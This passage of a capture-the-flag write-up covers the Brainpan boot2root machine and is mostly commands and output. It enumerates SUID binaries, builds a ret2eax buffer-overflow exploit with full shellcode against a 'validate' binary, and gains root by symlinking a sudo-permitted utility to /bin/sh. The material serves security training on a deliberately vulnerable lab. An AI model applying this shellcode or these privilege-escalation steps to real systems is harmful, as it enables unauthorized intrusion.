+</span><span class='line'>-rwxr-sr-x 1 root crontab 34784 Jun 14  2012 /usr/bin/crontab
+</span><span class='line'>-rwsr-xr-x 1 root root 60344 Jun 18  2012 /usr/bin/mtr
+</span><span class='line'>-rwxr-sr-x 1 root mail 13944 Jun 14  2012 /usr/bin/dotlockfile
+</span><span class='line'>-rwsr-xr-x 1 root root 30936 Sep  6  2012 /usr/bin/newgrp
+</span><span class='line'>-rwsr-xr-x 1 root root 31756 Sep  6  2012 /usr/bin/chsh
+</span><span class='line'>-rwxr-sr-x 1 root mlocate 34452 Aug 14  2012 /usr/bin/mlocate
+</span><span class='line'>-rwxr-sr-x 1 root shadow 18128 Sep  6  2012 /usr/bin/expiry
+</span><span class='line'>-rwxr-sr-x 1 root tty 9736 Jun 18  2012 /usr/bin/bsd-write
+</span><span class='line'>-rwsr-xr-x 2 root root 115140 Feb 27 14:27 /usr/bin/sudoedit
+</span><span class='line'>-rwsr-xr-x 1 root root 40300 Sep  6  2012 /usr/bin/chfn
+</span><span class='line'>-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-lock
+</span><span class='line'>-rwsr-xr-x 1 root root 14020 Oct  2 17:26 /usr/bin/traceroute6.iputils
+</span><span class='line'>-rwsr-sr-x 1 daemon daemon 46576 Jun 11  2012 /usr/bin/at
+</span><span class='line'>-rwsr-xr-x 1 root lpadmin 13672 Dec  4 09:21 /usr/bin/lppasswd
+</span><span class='line'>-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-touchlock
+</span><span class='line'>-rwsr-xr-x 1 root root 41292 Sep  6  2012 /usr/bin/passwd
+</span><span class='line'>-rwsr-xr-x 1 root root 57964 Sep  6  2012 /usr/bin/gpasswd
+</span><span class='line'>-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-unlock
+</span><span class='line'>-rwxr-sr-x 1 root ssh 128424 Sep  6  2012 /usr/bin/ssh-agent
+</span><span class='line'>-rwsr-sr-x 1 libuuid libuuid 17996 Sep  6  2012 /usr/sbin/uuidd
+</span><span class='line'>-rwsr-xr-- 1 root dip 301944 Sep 26  2012 /usr/sbin/pppd
+</span><span class='line'>**-rwsr-xr-x 1 anansi anansi 8761 Mar  4 11:06 /usr/local/bin/validate**
+</span><span class='line'>-rwsr-xr-- 1 root messagebus 317564 Oct  3 16:00 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span><span class='line'>-rwsr-xr-x 1 root root 248064 Sep  6  2012 /usr/lib/openssh/ssh-keysign
+</span><span class='line'>-rwsr-xr-x 1 root root 5452 Jun 25  2012 /usr/lib/eject/dmcrypt-get-device
+</span><span class='line'>-rwsr-xr-x 1 root root 9740 Oct  3 21:46 /usr/lib/pt_chown
+</span><span class='line'>-rwxr-sr-x 1 root shadow 30372 Jul  3  2012 /sbin/unix_chkpwd</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The bolded entry in our list appears to be suid one of the other users, so it&rsquo;s likely we&rsquo;ll need to attack this one.  And, as mentioned earlier, we have zero debugging tools.  To make matters even worse:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /proc/sys/kernel/randomize_va_space
+</span><span class='line'>2</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This means full address space layout randomization is enabled.  This should be fun without debugging tools.</p>
+
+<p>One solution (and one my good friend @mulitia used) is to put shellcode into an environmental variable, netcat over a binary for finding its address, then spamming VAS with that address.  This is a brute-force method that works, but in a real environment might not be the most stealthy of ways.  Another way is to make use of a JMP [register] (say, one we control) and move execution to shellcode space.  If we objdump the binary and hunt for JMP, there are none which point to registers.  Another option is CALL, which is essentially a macro to push/jmp:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~/brainpan# objdump -M intel -d validate | grep "call"
+</span><span class='line'> 8048353:    e8 00 00 00 00           call   8048358 &lt;_init+0xc&gt;
+</span><span class='line'> 8048369:    e8 1e 00 00 00           call   804838c &lt;__gmon_start__@plt&gt;
+</span><span class='line'> 804836e:    e8 1d 01 00 00           call   8048490 &lt;frame_dummy&gt;
+</span><span class='line'> 8048373:    e8 98 02 00 00           call   8048610 &lt;__do_global_ctors_aux&gt;
+</span><span class='line'> 804841c:    e8 7b ff ff ff           call   804839c &lt;__libc_start_main@plt&gt;
+</span><span class='line'> 8048468:    ff 14 85 14 9f 04 08     call   DWORD PTR [eax*4+0x8049f14]
+</span><span class='line'> 80484af:    ff d0                    call   eax
+</span><span class='line'> 80484f3:    e8 d4 fe ff ff           call   80483cc &lt;printf@plt&gt;
+</span><span class='line'> 80484ff:    e8 e8 fe ff ff           call   80483ec &lt;exit@plt&gt;
+</span><span class='line'> 8048511:    e8 96 fe ff ff           call   80483ac &lt;strlen@plt&gt;
+</span><span class='line'> 8048527:    e8 90 fe ff ff           call   80483bc &lt;strcpy@plt&gt;
+</span><span class='line'> 8048558:    e8 6f fe ff ff           call   80483cc &lt;printf@plt&gt;
+</span><span class='line'> 804856c:    e8 5b fe ff ff           call   80483cc &lt;printf@plt&gt;
+</span><span class='line'> 804857c:    e8 33 ff ff ff           call   80484b4 &lt;validate&gt;
+</span><span class='line'> 8048593:    e8 44 fe ff ff           call   80483dc &lt;puts@plt&gt;
+</span><span class='line'> 80485b6:    e8 4f 00 00 00           call   804860a &lt;__i686.get_pc_thunk.bx&gt;
+</span><span class='line'> 80485c4:    e8 83 fd ff ff           call   804834c &lt;_init&gt;
+</span><span class='line'> 80485f4:    ff 94 b3 18 ff ff ff     call   DWORD PTR [ebx+esi*4-0xe8]
+</span><span class='line'> 804862b:    ff d0                    call   eax
+</span><span class='line'> 8048643:    e8 00 00 00 00           call   8048648 &lt;_fini+0xc&gt;
+</span><span class='line'> 804864f:    e8 dc fd ff ff           call   8048430 &lt;__do_global_dtors_aux&gt;
+</span><span class='line'>root@bt:~/brainpan# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Two options here!  Let&rsquo;s see if we control EAX&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~/brainpan# gdb ./validate
+</span><span class='line'>Reading symbols from /root/brainpan/validate...done.
+</span><span class='line'>(gdb) r $(perl -e 'print "\x41"x120')
+</span><span class='line'>Starting program: /root/brainpan/validate $(perl -e 'print "\x41"x120')
+</span><span class='line'>warning: the debug information found in "/lib/ld-2.11.1.so" does not match "/lib/ld-linux.so.2" (CRC mismatch).
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x41414141 in ?? ()
+</span><span class='line'>(gdb) x/x $eax
+</span><span class='line'>0xffffd3e8:    0x41414141
+</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Great, we can now leverage a ret2eax attack.  We&rsquo;ll just need to fill up the required 116 bytes prior to the EIP overwrite, then fill that with our CALL EAX:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./validate $(perl -e 'print "\xbe\x1f\x41\x25\xe8\xd9\xed\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x0c\x83\xc3\x04\x31\x73\x0f\x03\x73\x10\xa3\xd0\x82\x25\x7b\x82\x01\x5f\x13\x99\xc6\x16\x04\x89\x27\x5b\xa3\x4a\x50\xb4\x51\x22\xce\x43\x76\xe6\xe6\x59\x79\x07\xf7\x72\x1b\x6e\x99\xa3\xbf\x11\x16\xd3\x3f\x85\x8b\xaa\xa1\xe4\xac" . "\x90"x44 . "\x2b\x86\x04\x08"')
+</span><span class='line'>$ whoami
+</span><span class='line'>anansi</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Success; another local user.  I&rsquo;d like to briefly note that I had alot of issues getting shellcode to work if it was placed after the NOP sled, as opposed to before.</p>
+
+<p>Now that we&rsquo;ve got our second account, we can hunt around the system in search of more binaries to exploit.  As our prior search discovered, nothing is suid root.  Checking out /home/anansi gives us:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ pwd && ls -lh
+</span><span class='line'>/home/anansi/bin
+</span><span class='line'>total 8.0K
+</span><span class='line'>-rwxr-xr-x 1 anansi anansi 7.1K Mar  4 10:58 anansi_util
+</span><span class='line'>$ ./anansi_util
+</span><span class='line'>Usage: ./anansi_util [action]
+</span><span class='line'>Where [action] is one of:
+</span><span class='line'>  - network
+</span><span class='line'>  - proclist
+</span><span class='line'>  - manual [command]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I couldn&rsquo;t find any segmentation faults with this, but I did note the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo -l
+</span><span class='line'>Matching Defaults entries for puck on this host:
+</span><span class='line'>    env_reset, mail_badpass,
+</span><span class='line'>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span><span class='line'>
+</span><span class='line'>User puck may run the following commands on this host:
+</span><span class='line'>    (root) NOPASSWD: /home/anansi/bin/anansi_util</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It would appear we can <code>sudo ./anansi_util</code> without the need for a password.  And we own the binary!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ mv anansi_util anansi_util_bkp
+</span><span class='line'>$ ln -s /bin/sh ./anansi_util
+</span><span class='line'>$ ls -lh
+</span><span class='line'>total 8.0K
+</span><span class='line'>lrwxrwxrwx 1 anansi puck      7 Mar 31 15:27 anansi_util -&gt; /bin/sh
+</span><span class='line'>-rwxr-xr-x 1 anansi anansi 7.1K Mar  4 10:58 anansi_util_bkp
+</span><span class='line'>$ sudo ./anansi_util
+</span><span class='line'>$ whoami
+</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
+
+
+<p>One of the more interesting boot2root&rsquo;s I&rsquo;ve had the privilege of exploiting, and a trend I hope to see continue.</p>
 ]]></content>
   </entry>
   
